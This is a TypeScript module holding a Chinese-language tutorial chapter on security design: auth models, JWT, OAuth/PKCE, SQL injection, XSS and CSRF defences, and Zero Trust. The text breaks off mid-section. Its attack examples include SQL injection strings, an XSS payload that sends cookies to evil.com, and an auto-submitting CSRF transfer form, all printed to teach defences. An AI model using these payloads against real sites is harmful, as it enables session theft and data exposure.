import type { ChapterContent } from '../../types.js';

export default {
  title: '安全性設計',
  content: `
<section id="authn-authz">
  <h2>Authentication vs Authorization</h2>
  <p>Authentication（認證）和 Authorization（授權）是安全系統的兩個基礎概念，常被混淆，但代表截然不同的問題。認證解答「你是誰？」，授權解答「你能做什麼？」。在系統設計面試中，必須清晰區分兩者，並能深入討論各種授權模型的取捨。</p>

  <arch-diagram src="./diagrams/ch14-security.json" caption="安全性系統架構：展示認證、授權、Token 流程、Zero Trust 元件的整體關係。"></arch-diagram>

  <h3>Authentication：你是誰？</h3>
  <p>Authentication 驗證使用者的身份——確認「請求者確實是他們所聲稱的人」。常見方式：</p>
  <ul>
    <li><strong>密碼</strong>：最傳統的方式，應搭配 bcrypt/Argon2 等慢雜湊函數（故意慢，增加暴力破解成本）</li>
    <li><strong>OTP（一次性密碼）</strong>：TOTP（Google Authenticator）或 SMS 驗證碼</li>
    <li><strong>生物辨識</strong>：指紋、Face ID（通常在設備端完成，不傳輸生物特徵）</li>
    <li><strong>Certificate</strong>：mTLS 中客戶端提供 X.509 憑證</li>
    <li><strong>SSO</strong>：透過受信任的第三方（Google、GitHub）驗證身份</li>
    <li><strong>Passkey（FIDO2/WebAuthn）</strong>：取代密碼的新標準，使用公私鑰對，防止釣魚攻擊</li>
  </ul>
  <pre data-lang="text"><code class="language-text">多因素認證（MFA）= 以下至少兩項：
- 知識因素：你知道的（密碼、PIN、安全問題）
- 持有因素：你擁有的（手機、硬體 Token、YubiKey）
- 固有因素：你本身的（指紋、虹膜、聲紋）

密碼強雜湊比較：
  bcrypt：可調 cost factor，預設 ~100ms/hash（防暴力破解）
  Argon2id：記憶體硬化，抗 GPU 暴力破解，NIST 推薦
  scrypt：類似 Argon2，更早出現
  MD5/SHA1：不可用於密碼！速度太快，GPU 每秒可嘗試數十億次</code></pre>

  <h3>Authorization：你能做什麼？</h3>
  <p>Authorization 決定已認證的使用者有哪些權限。有三種主流模型，各有適用場景：</p>

  <h3>RBAC vs ABAC vs PBAC 詳細比較</h3>
  <pre data-lang="text"><code class="language-text">┌─────────────┬──────────────────────┬─────────────────────┬────────────────────────┐
│ 模型        │ RBAC                 │ ABAC                │ PBAC / ReBAC           │
│             │ 角色為基礎的存取控制 │ 屬性為基礎的存取控制│ 策略/關係為基礎的存取控制│
├─────────────┼──────────────────────┼─────────────────────┼────────────────────────┤
│ 核心概念    │ 用戶 → 角色 → 權限   │ 屬性 + 條件 = 決策  │ 用戶與資源的關係        │
│ 決策依據    │ 用戶的角色           │ 多維屬性組合         │ 資源關係圖              │
│ 靈活度      │ 低（角色爆炸問題）   │ 高（任意條件）       │ 高（圖遍歷）            │
│ 實作複雜度  │ 簡單                 │ 複雜                 │ 複雜                    │
│ 效能        │ 高                   │ 中（需計算條件）     │ 中（需查詢關係）        │
│ 適用場景    │ SaaS 多租戶、企業 IAM│ 金融合規、醫療       │ Google Docs、GitHub     │
│ 代表實作    │ AWS IAM Roles        │ AWS IAM Policies     │ Google Zanzibar         │
└─────────────┴──────────────────────┴─────────────────────┴────────────────────────┘</code></pre>

  <pre data-lang="typescript"><code class="language-typescript">// RBAC 範例：角色 → 權限映射
const rbacRoles = {
  admin:   ['read', 'write', 'delete', 'manage_users'],
  editor:  ['read', 'write'],
  viewer:  ['read'],
};

function canPerform(user: User, action: string): boolean {
  return rbacRoles[user.role]?.includes(action) ?? false;
}

// ABAC 範例：根據多個屬性動態決策
interface AbacContext {
  user: { id: string; department: string; clearanceLevel: number };
  resource: { ownerId: string; classification: string; department: string };
  environment: { time: Date; ipAddress: string };
}

function abacDecision(ctx: AbacContext, action: string): boolean {
  // 策略 1：只能存取同部門的資料
  if (ctx.resource.department !== ctx.user.department) return false;
  // 策略 2：機密資料需要對應的安全等級
  if (ctx.resource.classification === 'TOP_SECRET' && ctx.user.clearanceLevel < 3) return false;
  // 策略 3：非工作時間不允許 DELETE 操作
  const hour = ctx.environment.time.getHours();
  if (action === 'delete' && (hour < 9 || hour > 18)) return false;
  return true;
}

// ReBAC（Google Zanzibar 風格）：用關係圖判斷權限
// tuple: (object, relation, user)
// e.g., (doc:123, viewer, user:456) 表示 user:456 是 doc:123 的 viewer
async function zanzibarCheck(
  object: string,   // e.g., "doc:123"
  relation: string, // e.g., "editor"
  user: string      // e.g., "user:456"
): Promise<boolean> {
  // 遞迴查詢關係圖
  // doc:123#editor@user:456（直接授權）
  // doc:123#editor@group:eng#member（透過群組繼承）
  // folder:root#editor@user:456 → doc:123#parent@folder:root（繼承父資料夾權限）
  return await zanzibarService.check({ object, relation, user });
}</code></pre>

  <h3>Permission Matrix 設計</h3>
  <pre data-lang="text"><code class="language-text">SaaS 多租戶系統的 Permission Matrix 範例：

              │ 讀文章 │ 寫文章 │ 刪文章 │ 管理成員 │ 查看帳單 │ 設定 Webhook │
──────────────┼────────┼────────┼────────┼──────────┼──────────┼──────────────│
Owner         │  ✓     │  ✓     │  ✓     │  ✓       │  ✓       │  ✓           │
Admin         │  ✓     │  ✓     │  ✓     │  ✓       │  ✗       │  ✓           │
Editor        │  ✓     │  ✓     │  自己  │  ✗       │  ✗       │  ✗           │
Viewer        │  ✓     │  ✗     │  ✗     │  ✗       │  ✗       │  ✗           │
Guest         │  公開  │  ✗     │  ✗     │  ✗       │  ✗       │  ✗           │

細粒度規則（超出角色範圍）：
  - Editor 只能刪除自己建立的文章（Resource Owner 檢查）
  - 即使是 Admin，也無法存取其他租戶的資料（租戶隔離）</code></pre>

  <h3>細粒度授權（Fine-grained Authorization）</h3>
  <pre data-lang="typescript"><code class="language-typescript">// 細粒度授權：結合 RBAC 基礎 + ABAC 細粒度條件
interface AuthorizationDecision {
  allowed: boolean;
  reason?: string;
}

class FineGrainedAuthorizationService {
  async check(
    user: User,
    action: string,
    resource: Resource
  ): Promise<AuthorizationDecision> {
    // Layer 1：RBAC 基礎檢查（最快）
    const rolePermissions = await this.getRolePermissions(user.roles);
    if (!rolePermissions.has(action)) {
      return { allowed: false, reason: 'Role does not have permission' };
    }

    // Layer 2：租戶隔離（多租戶必須）
    if (resource.tenantId !== user.tenantId) {
      return { allowed: false, reason: 'Cross-tenant access denied' };
    }

    // Layer 3：Resource Owner 檢查（刪除只能刪自己的）
    if (action === 'delete' && resource.ownerId !== user.id) {
      const isAdmin = user.roles.includes('admin');
      if (!isAdmin) {
        return { allowed: false, reason: 'Only resource owner or admin can delete' };
      }
    }

    // Layer 4：環境條件（如 IP 白名單、時間限制）
    if (resource.sensitivity === 'HIGH') {
      const isAllowedIp = await this.checkIpAllowlist(user.id, user.ipAddress);
      if (!isAllowedIp) {
        return { allowed: false, reason: 'IP not in allowlist for sensitive resources' };
      }
    }

    // 記錄審計日誌
    await this.auditLog({ user, action, resource, decision: 'ALLOW' });
    return { allowed: true };
  }
}</code></pre>

  <callout-box type="info" title="403 vs 401 的正確使用">
    <p>401 Unauthorized（命名歷史錯誤）實際上表示「未認證」：請求缺少有效的認證憑證，應提示用戶登入。403 Forbidden 表示「已認證但未授權」：系統知道你是誰，但你沒有執行此操作的權限。注意：某些場景刻意用 404 替代 403，避免洩露資源是否存在（Security by obscurity 的輔助手段）。</p>
  </callout-box>
</section>

<section id="jwt-vs-session">
  <h2>JWT vs Session Token 的取捨</h2>
  <p>這是現代 Web 應用最常見的安全架構決策之一，兩種方案各有適用場景。理解底層機制比背誦優缺點更重要。</p>

  <h3>Session Token（有狀態）</h3>
  <pre data-lang="text"><code class="language-text">登入流程：
1. 用戶提交 username/password
2. 伺服器驗證後，在資料庫（Redis）建立 Session
   sessions:abc123 = { userId: 456, roles: ['admin'], expires: ... }
3. 伺服器返回 Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

後續請求：
1. 瀏覽器自動帶上 Cookie: session_id=abc123
2. 伺服器在 Redis 查詢 sessions:abc123
3. 驗證未過期，返回對應的用戶資訊</code></pre>
  <p><strong>優點</strong>：可以立即吊銷（revoke）——直接刪除 Redis 中的 Session；Session 資料不暴露給客戶端。</p>
  <p><strong>缺點</strong>：每次請求都需要查詢 Redis，增加延遲；多伺服器環境需要共享 Session 儲存（不能只存在記憶體）。</p>

  <h3>JWT 結構分解（Header.Payload.Signature）</h3>
  <p>JWT 由三部分組成，每部分都是 Base64URL 編碼，用 . 分隔。</p>
  <pre data-lang="json"><code class="language-json">// 完整 JWT 範例：
// eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0NTYiLCJpc3MiOiJhdXRoLm15YXBwLmNvbSJ9.SIGNATURE

// Part 1: Header（演算法和 Token 類型）
{
  "alg": "RS256",  // 演算法：RS256（非對稱）或 HS256（對稱）
  "typ": "JWT",
  "kid": "key-id-2025"  // Key ID：支援金鑰輪換
}

// Part 2: Payload（Claims，聲明）
{
  "sub": "456",            // Subject（用戶 ID）—— Registered Claim
  "iss": "auth.myapp.com", // Issuer（發行者）
  "aud": "api.myapp.com",  // Audience（接收者）
  "iat": 1735689600,       // Issued At（發行時間，Unix 時間戳）
  "exp": 1735693200,       // Expiration（過期時間，1 小時後）
  "nbf": 1735689600,       // Not Before（生效時間）
  "jti": "uuid-v4-unique", // JWT ID（用於吊銷檢查）
  "roles": ["admin"],      // Custom Claims（自定義聲明）
  "tenant_id": "org-123"   // 多租戶場景
}

// Part 3: Signature（簽名，防篡改）
// RS256：使用私鑰對 Base64(Header) + "." + Base64(Payload) 簽名
// 驗證時用公鑰，不需要私鑰 → 可以分發公鑰給所有 Resource Server</code></pre>

  <pre data-lang="typescript"><code class="language-typescript">import jwt from 'jsonwebtoken';

// 簽發 Token（Auth Server，持有私鑰）
function issueAccessToken(userId: string, roles: string[], tenantId: string): string {
  return jwt.sign(
    {
      sub: userId,
      roles,
      tenant_id: tenantId,
      jti: crypto.randomUUID(),  // 每個 Token 有唯一 ID（用於吊銷）
    },
    privateKey,
    {
      algorithm: 'RS256',
      expiresIn: '15m',          // Access Token 短效：15 分鐘
      issuer: 'auth.myapp.com',
      audience: 'api.myapp.com',
    }
  );
}

// 驗證 Token（Resource Server，使用公鑰）
function verifyToken(token: string): JwtPayload {
  return jwt.verify(token, publicKey, {
    algorithms: ['RS256'],        // 嚴格指定演算法白名單！
    issuer: 'auth.myapp.com',
    audience: 'api.myapp.com',
    clockTolerance: 30,           // 允許 30 秒的時鐘偏差
  }) as JwtPayload;
}

// JWKS（JSON Web Key Set）：讓 Resource Server 自動獲取最新公鑰
// GET https://auth.myapp.com/.well-known/jwks.json
// 返回：{ "keys": [{ "kty": "RSA", "kid": "key-id-2025", "n": "...", "e": "AQAB" }] }</code></pre>

  <h3>Access Token + Refresh Token 完整流程</h3>
  <pre data-lang="text"><code class="language-text">初次登入：
  Client ──[POST /login {username, password}]──► Auth Server
  Auth Server ──[Access Token (15min JWT) + Refresh Token (30天 UUID)]──► Client
  Client：
    Access Token → 存在記憶體（JavaScript 變數）
    Refresh Token → 存在 HttpOnly Cookie（防 XSS）

API 請求（Access Token 有效時）：
  Client ──[Authorization: Bearer {Access Token}]──► Resource Server
  Resource Server：驗證 JWT 簽名（無需 Redis 查詢）→ 返回資料

Access Token 過期後的靜默刷新（Silent Refresh）：
  1. Resource Server 返回 401
  2. Client 攔截 401，自動發送 Refresh Token 請求
  3. Client ──[POST /refresh {Refresh Token in Cookie}]──► Auth Server
  4. Auth Server 驗證 Refresh Token：
     - 查詢 Redis：refresh_tokens:{token} 是否存在
     - 檢查是否過期
     - （可選）Refresh Token Rotation：使此 Token 失效，發新的
  5. Auth Server 返回新的 Access Token（+ 新的 Refresh Token）
  6. Client 更新記憶體中的 Access Token，重試原請求

登出：
  1. Client 清除記憶體中的 Access Token
  2. 呼叫 POST /logout，服務端刪除 Redis 中的 Refresh Token
  3. Access Token 仍有效直到自然過期（15min 可接受）
     若需要立即失效：維護 JWT Deny List（喪失無狀態優勢）</code></pre>

  <h3>Token 撤銷（Revocation）的挑戰</h3>
  <pre data-lang="typescript"><code class="language-typescript">// 挑戰：JWT 是無狀態的，一旦簽發就無法立即撤銷
// 場景：用戶帳號被入侵，需要立即讓所有 Token 失效

// 方案一：短效 Token（最簡單）
// Access Token 只有 5-15 分鐘，接受最多 15 分鐘的「殘留有效期」
// 適合：大多數場景

// 方案二：JWT Deny List（Blocklist）
// 在 Redis 維護已吊銷的 JTI（JWT ID）集合
async function revokeToken(jti: string, exp: number): Promise<void> {
  const ttl = exp - Math.floor(Date.now() / 1000); // 到期前的剩餘時間
  if (ttl > 0) {
    await redis.setex(\`jwt:deny:\${jti}\`, ttl, '1');
  }
}

// 每次請求都需要查詢 Deny List（犧牲部分無狀態優勢）
async function isRevoked(jti: string): Promise<boolean> {
  return (await redis.exists(\`jwt:deny:\${jti}\`)) === 1;
}

// 方案三：Token 版本號（Token Versioning）
// 在用戶記錄中維護一個版本號，JWT 中包含版本號
// 強制刷新時，遞增版本號，所有舊版本 JWT 立即失效
interface UserRecord {
  id: string;
  tokenVersion: number; // 每次強制登出時 +1
}

// JWT Payload 包含 token_version
// { "sub": "456", "token_version": 3, ... }

async function verifyWithVersion(token: string): Promise<boolean> {
  const payload = verifyToken(token);
  const user = await db.getUser(payload.sub);
  // Token 版本必須匹配當前版本
  return payload.token_version === user.tokenVersion;
}</code></pre>

  <h3>JWT 安全陷阱</h3>
  <callout-box type="danger" title="常見 JWT 安全漏洞">
    <p><strong>alg:none 攻擊</strong>：早期實作允許客戶端指定 alg=none，跳過簽名驗證。永遠在服務端明確指定允許的演算法白名單，例如 ['RS256']，絕不接受 none。</p>
    <p><strong>RS256 vs HS256 混淆攻擊</strong>：若伺服器支援兩種演算法，攻擊者可以把 RS256 的公鑰當 HS256 的密鑰來偽造 Token。應嚴格限制演算法，一個服務只用一種。</p>
    <p><strong>敏感資料放入 Payload</strong>：JWT Payload 只是 Base64 編碼，不加密！任何人都能解碼查看。密碼、信用卡號、SSN 絕不應放入 JWT。</p>
    <p><strong>Access Token 存入 localStorage</strong>：localStorage 可被 XSS 攻擊讀取。Access Token 存記憶體，Refresh Token 存 HttpOnly Cookie。</p>
  </callout-box>
</section>

<section id="oauth-oidc">
  <h2>OAuth 2.0 / OIDC 流程設計</h2>
  <p>OAuth 2.0 是「授權委託」協定——允許第三方應用在有限範圍內存取用戶資源，而無需分享密碼。OIDC（OpenID Connect）在 OAuth 2.0 之上增加了身份層，使 OAuth 也能用於認證。</p>

  <h3>OAuth 2.0 Authorization Code Flow with PKCE 詳細步驟</h3>
  <p>PKCE（Proof Key for Code Exchange）是針對公開客戶端（SPA、行動 App）的安全增強，防止授權碼截取攻擊。</p>
  <pre data-lang="text"><code class="language-text">角色：
- Resource Owner（RO）：用戶（擁有資源）
- Client：第三方應用（想存取資源）
- Authorization Server（AS）：負責認證和發 Token（如 Google）
- Resource Server（RS）：提供 API 資源的伺服器

完整 PKCE 流程：

【步驟 1】Client 生成 PKCE 參數（在客戶端執行）
  code_verifier = crypto.randomBytes(32).toString('base64url')
  // e.g., "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
  code_challenge = base64url(sha256(code_verifier))
  // e.g., "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

【步驟 2】Client 重定向用戶到 AS（瀏覽器跳轉）
  GET https://accounts.google.com/o/oauth2/v2/auth
    ?response_type=code
    &client_id=CLIENT_ID
    &redirect_uri=https://myapp.com/callback
    &scope=openid email profile calendar.readonly
    &state=random_csrf_token_stored_in_sessionStorage
    &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
    &code_challenge_method=S256
    &nonce=random_nonce_for_id_token            ← OIDC 防重放攻擊

【步驟 3】用戶在 AS 登入並授權（顯示授權範圍說明）

【步驟 4】AS 重定向回 Client（攜帶授權碼）
  https://myapp.com/callback
    ?code=4/P7q7W91a-oMsCeLvIaQm6bTrgtp7       ← 短效授權碼（10 分鐘）
    &state=random_csrf_token                   ← 必須驗證此 state！

  Client 驗證：state 是否匹配 sessionStorage 中的值（防 CSRF）

【步驟 5】Client 後端用授權碼換 Token（伺服器端執行，不暴露給瀏覽器）
  POST https://oauth2.googleapis.com/token
    Content-Type: application/x-www-form-urlencoded

    grant_type=authorization_code
    &code=4/P7q7W91a-oMsCeLvIaQm6bTrgtp7
    &redirect_uri=https://myapp.com/callback
    &client_id=CLIENT_ID
    &client_secret=CLIENT_SECRET               ← 機密客戶端才有
    &code_verifier=dBjftJeZ4CVP-mB92K27...    ← PKCE：AS 用它驗證 challenge

【步驟 6】AS 驗證並返回 Token
  AS 計算：base64url(sha256(code_verifier)) 是否等於 code_challenge
  {
    "access_token": "ya29.a0AfH6SMBQ...",
    "token_type": "Bearer",
    "expires_in": 3600,
    "refresh_token": "1//0gLNa...",
    "scope": "openid email profile calendar.readonly",
    "id_token": "eyJhbGciOiJSUzI1NiJ9..."     ← OIDC：包含用戶身份
  }

【步驟 7】Client 用 Access Token 存取 Resource Server
  GET https://www.googleapis.com/calendar/v3/calendars
  Authorization: Bearer ya29.a0AfH6SMBQ...</code></pre>

  <h3>OIDC UserInfo Endpoint</h3>
  <pre data-lang="typescript"><code class="language-typescript">// 方式一：直接解碼 ID Token（離線驗證）
import { jwtVerify, createRemoteJWKSet } from 'jose';

const JWKS = createRemoteJWKSet(
  new URL('https://accounts.google.com/.well-known/jwks.json')
);

async function verifyIdToken(idToken: string) {
  const { payload } = await jwtVerify(idToken, JWKS, {
    issuer: 'https://accounts.google.com',
    audience: CLIENT_ID,
  });

  // payload 包含：
  // sub: "10769150350006150715113082367"  ← 用戶唯一 ID（穩定，不隨 email 改變）
  // email: "user@gmail.com"
  // email_verified: true
  // name: "John Doe"
  // picture: "https://..."
  // nonce: "random_nonce"               ← 驗證 nonce 防重放
  return payload;
}

// 方式二：呼叫 UserInfo Endpoint（取得最新資訊）
async function getUserInfo(accessToken: string) {
  const response = await fetch('https://openidconnect.googleapis.com/v1/userinfo', {
    headers: { 'Authorization': \`Bearer \${accessToken}\` },
  });
  return response.json();
  // 返回：{ sub, email, email_verified, name, picture, locale, ... }
}</code></pre>

  <h3>SSO（Single Sign-On）設計</h3>
  <pre data-lang="text"><code class="language-text">企業 SSO 流程（使用 OIDC）：

用戶訪問 app-a.mycompany.com：
  1. 檢查本地 Session → 沒有
  2. 重定向到 SSO 服務（Identity Provider, IdP）
     https://sso.mycompany.com/auth
       ?client_id=app-a&redirect_uri=...&scope=openid&state=...

SSO 服務：
  3. 檢查 SSO Session Cookie → 沒有
  4. 顯示公司統一登入頁面
  5. 用戶輸入企業帳號密碼（或使用 MFA）
  6. 建立 SSO Session（跨應用共享）
  7. 重定向回 app-a，帶 ID Token 和 Access Token

用戶訪問 app-b.mycompany.com：
  1. 檢查本地 Session → 沒有
  2. 重定向到 SSO 服務
  3. SSO 服務：檢查 SSO Session Cookie → 有！（已登入）
  4. 無需再次輸入密碼，直接頒發 app-b 的 Token
  5. 重定向回 app-b

SSO 登出（全域登出）：
  前端呼叫 GET /sso/logout
  SSO 服務：
    - 刪除 SSO Session
    - 通知所有子應用（Back-channel Logout）撤銷對應 Session
    - 重定向到登出成功頁面</code></pre>

  <callout-box type="tip" title="何時用 OAuth，何時用 JWT？">
    <p>OAuth/OIDC 解決的是「第三方授權」和「跨系統 SSO」問題。如果是自己的前後端單體應用，不需要 OAuth 的複雜流程，直接用 JWT（或 Session）即可。只有當需要「讓第三方應用代表用戶存取你的 API」或「多個應用之間的 SSO」時，才需要實作 OAuth/OIDC。</p>
  </callout-box>
</section>

<section id="common-attacks">
  <h2>SQL Injection / XSS / CSRF 防禦</h2>
  <p>OWASP Top 10 中長期存在的三種攻擊，每個工程師都必須徹底理解防禦機制。這裡不只介紹攻擊原理，更重視可實際部署的防禦代碼。</p>

  <h3>SQL Injection：防禦代碼示例</h3>
  <p>攻擊者透過輸入注入 SQL 語句，操控資料庫查詢。危害範圍從讀取所有資料，到刪除整個資料庫。</p>
  <pre data-lang="typescript"><code class="language-typescript">// 漏洞範例一：字串拼接（最危險）
const userId = req.query.id; // 攻擊者輸入："1 OR 1=1"
const sql = \`SELECT * FROM users WHERE id = \${userId}\`;
// 實際執行：SELECT * FROM users WHERE id = 1 OR 1=1
// → 返回所有用戶！

// 漏洞範例二：UNION 攻擊（資料洩漏）
// 攻擊者輸入："1 UNION SELECT username, password, null FROM admin_users--"
// → 將 admin 密碼 hash 暴露在結果中

// 漏洞範例三：盲注（Blind Injection）
// 攻擊者輸入："1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a'"
// 透過回應時間或布林值逐字元猜測密碼

// ==================== 正確防禦 ====================

// 方法一：參數化查詢（Parameterized Queries）—— 最推薦
import { Pool } from 'pg';
const db = new Pool();

async function getUserById(id: string) {
  const result = await db.query(
    'SELECT id, email, name FROM users WHERE id = $1',
    [id]  // 資料庫驅動自動處理轉義，id 永遠被視為資料，不是 SQL
  );
  return result.rows[0];
}

// 方法二：ORM（底層使用參數化查詢）
import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();

async function searchUsers(email: string) {
  return prisma.user.findMany({
    where: { email: { contains: email } }, // ORM 自動防注入
    select: { id: true, email: true, name: true }, // 最小欄位原則
  });
}

// 方法三：若必須動態建立 SQL，使用白名單驗證
const ALLOWED_COLUMNS = ['name', 'email', 'created_at'] as const;
type AllowedColumn = typeof ALLOWED_COLUMNS[number];

async function sortUsers(sortBy: string, order: 'ASC' | 'DESC') {
  // 嚴格驗證，防止欄位注入
  if (!ALLOWED_COLUMNS.includes(sortBy as AllowedColumn)) {
    throw new Error('Invalid sort column');
  }
  if (!['ASC', 'DESC'].includes(order)) {
    throw new Error('Invalid sort order');
  }
  // 此時 sortBy 和 order 都已通過白名單驗證，安全拼接
  return db.query(\`SELECT * FROM users ORDER BY \${sortBy} \${order}\`);
}

// 最小權限原則：應用程式的資料庫帳號
// ✓ SELECT, INSERT, UPDATE（業務需要）
// ✗ DROP TABLE（永遠不需要）
// ✗ CREATE USER（永遠不需要）</code></pre>

  <h3>XSS（Cross-Site Scripting）三種類型與防禦</h3>
  <p>攻擊者注入惡意 JavaScript，在其他用戶的瀏覽器中執行，竊取 Cookie/Session 或執行任意操作。</p>
  <pre data-lang="typescript"><code class="language-typescript">// ===== 類型一：Stored XSS（最危險）=====
// 攻擊者在評論中輸入：<script>fetch('https://evil.com?c='+document.cookie)</script>
// 此評論被存入資料庫，每個查看評論的用戶都受害

// ===== 類型二：Reflected XSS =====
// URL：https://myapp.com/search?q=<script>alert(1)</script>
// 伺服器直接將 q 的值嵌入 HTML：<p>搜尋結果：<script>alert(1)</script></p>

// ===== 類型三：DOM-based XSS =====
// 攻擊者構造惡意 URL：https://myapp.com/#<img src=x onerror=alert(1)>
// 前端 JS 直接讀取並注入：document.getElementById('msg').innerHTML = location.hash

// ==================== 防禦層次 ====================

// 防禦一：Output Encoding（輸出時轉義）
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
    '/': '&#x2F;',
  };
  return text.replace(/[&<>"'\/]/g, (char) => map[char]);
}

// 在 React/Vue 等現代框架中：
// ✓ {userComment} → 自動轉義（安全）
// ✗ dangerouslySetInnerHTML={{ __html: userComment }} → 危險！

// 防禦二：DOMPurify（需要允許 HTML 時的最後手段）
import DOMPurify from 'dompurify';
const sanitized = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  FORBID_SCRIPTS: true,
});

// 防禦三：Content Security Policy（CSP）—— 縱深防禦
// 即使 XSS 注入成功，CSP 可以阻止惡意腳本執行</code></pre>

  <pre data-lang="http"><code class="language-http"># 嚴格的 CSP Header
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{RANDOM_NONCE_PER_REQUEST}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://cdn.myapp.com data:;
  font-src 'self';
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';          # 防止 Clickjacking
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;

# nonce 方案：每個請求生成隨機 nonce，只有帶此 nonce 的 script 才能執行
# <script nonce="abc123xyz">...</script>  ← 允許
# <script>攻擊者注入的代碼</script>        ← 被 CSP 阻止

# 防止 Cookie 被 JavaScript 存取
Set-Cookie: session_id=abc; HttpOnly; Secure; SameSite=Strict</code></pre>

  <h3>CSRF（Cross-Site Request Forgery）防禦</h3>
  <p>攻擊者誘騙已認證的用戶，讓其瀏覽器向目標網站發送惡意請求。關鍵：瀏覽器會自動帶上 Cookie，攻擊者利用此機制。</p>
  <pre data-lang="html"><code class="language-html">&lt;!-- 惡意網站上的攻擊程式碼 --&gt;
&lt;!-- 受害者瀏覽惡意網站時，瀏覽器自動發送帶 Cookie 的請求 --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000" /&gt;

&lt;form action="https://bank.com/transfer" method="POST" style="display:none"&gt;
  &lt;input name="to" value="attacker" /&gt;
  &lt;input name="amount" value="10000" /&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>

  <pre data-lang="typescript"><code class="language-typescript">// 防禦一：SameSite Cookie（現代最有效的防禦）
// SameSite=Strict：只有相同站點的請求才攜帶 Cookie
// SameSite=Lax：允許頂層導航的 GET 攜帶 Cookie（但 POST/PUT 不行）
// Set-Cookie: session_id=abc; SameSite=Strict; Secure; HttpOnly

// 防禦二：CSRF Token（同步器令牌模式，Synchronizer Token Pattern）
import crypto from 'crypto';

// 生成並存儲 CSRF Token
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  // 將 Token 暴露給前端（嵌入 HTML 或 Meta 標籤）
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// 驗證 Middleware（應用於所有狀態修改請求）
function csrfProtection(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const tokenFromHeader = req.headers['x-csrf-token'];
  const tokenFromBody = req.body?._csrf;
  const submittedToken = tokenFromHeader || tokenFromBody;

  if (!submittedToken || submittedToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
}

// 防禦三：Double Submit Cookie（無 Session 時的替代方案）
// 在 Cookie 和請求 Body/Header 中都包含相同的隨機值
// 攻擊者無法讀取 Cookie（跨域），所以無法複製到 Header
function doubleSubmitCsrf(req: Request, res: Response, next: NextFunction) {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
}

// 防禦四：驗證 Origin/Referer Header
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.headers.origin;
  if (origin && !['https://myapp.com', 'https://www.myapp.com'].includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
});</code></pre>

  <h3>輸入驗證最佳實踐</h3>
  <pre data-lang="typescript"><code class="language-typescript">import { z } from 'zod'; // Zod：TypeScript-first 的輸入驗證庫

// 在 API 入口驗證所有輸入（防注入的第一道防線）
const createUserSchema = z.object({
  username: z
    .string()
    .min(3).max(50)
    .regex(/^[a-zA-Z0-9_-]+$/, '只允許字母、數字、底線、連字號'),
  email: z.string().email(),
  age: z.number().int().min(0).max(150),
  website: z.string().url().optional(),
  // 防止 Mass Assignment：只接受明確定義的欄位
});

app.post('/users', async (req, res) => {
  const parseResult = createUserSchema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: parseResult.error.issues,
    });
  }
  // parseResult.data 已通過驗證，類型安全
  const { username, email, age, website } = parseResult.data;
  // ...
});</code></pre>

  <callout-box type="tip" title="現代 SPA 的防禦策略">
    <p>對於現代 SPA（React/Vue/Angular），推薦的組合防禦：(1) SameSite=Strict Cookie + HttpOnly；(2) Content-Security-Policy nonce；(3) 所有 API 要求 Content-Type: application/json（原生 HTML 表單無法設定此 Header，增加 CSRF 難度）；(4) 所有用戶輸入透過 Schema 驗證（Zod/Joi/Yup）；(5) 使用 Helmet.js 自動設定安全 HTTP Headers。</p>
  </callout-box>
</section>

<section id="zero-trust">
  <h2>Zero Trust Architecture</h2>
  <p>傳統安全模型基於「城堡護城河」思維：假設內網是安全的，外部是危險的。Zero Trust 徹底推翻此假設：<strong>「永不信任，始終驗證（Never Trust, Always Verify）」</strong>。這不是產品或技術，而是一種安全設計哲學。</p>

  <h3>為什麼需要 Zero Trust？</h3>
  <p>傳統邊界安全的破綻在現代環境中已不可接受：</p>
  <ul>
    <li>員工遠端工作，無法依賴「在內網就安全」的假設</li>
    <li>供應鏈攻擊（SolarWinds 事件）：攻擊者透過受信任的供應商進入內網，在內網中橫向移動長達數月</li>
    <li>雲端環境：資源分散在多個雲端供應商，沒有明確的「內部」邊界</li>
    <li>微服務架構：服務之間大量相互呼叫，「信任內網」意味著任何服務被入侵都能橫向移動至所有服務</li>
  </ul>

  <h3>Zero Trust 核心原則</h3>
  <pre data-lang="text"><code class="language-text">原則一：驗證每個請求（Verify Explicitly）
  - 每個 API 呼叫都需要認證（Authentication）和授權（Authorization）
  - 不因為是內部服務就免驗證，不因為是 VPN 內就信任
  - 使用 mTLS 確保服務身份（雙向認證）
  - 結合多個信號做決策：身份、設備健康狀態、位置、行為

原則二：最小權限存取（Least Privilege Access）
  - 每個服務只有完成任務所需的最小權限集合
  - Just-In-Time（JIT）存取：需要時才臨時授權，完成後自動撤銷
